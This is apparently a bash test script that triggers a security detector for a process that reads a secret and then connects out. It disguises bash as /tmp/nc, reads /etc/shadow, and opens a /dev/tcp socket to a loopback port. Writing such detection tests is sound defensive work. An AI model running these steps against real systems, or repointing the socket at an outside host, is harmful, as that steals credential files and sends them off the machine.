#!/usr/bin/env bash
# T1552+T1041 — a suspicious process reads a secret THEN beacons, same pid, firing
# `suspicious_process_read_sensitive_and_connected` (OCSF 9002). bash-as-/tmp/nc
# makes the process half suspicious; the read + connect complete the exfil chain.
set -eu
host="${SINK_LOOPBACK:-127.0.0.1}"
port="${SINK_PORT:-4444}"
cp -f "$(command -v bash)" /tmp/nc && chmod +x /tmp/nc
timeout 5 /tmp/nc -c "cat /etc/shadow >/dev/null 2>&1; exec 3<>/dev/tcp/${host}/${port}; sleep 1" 2>/dev/null || true
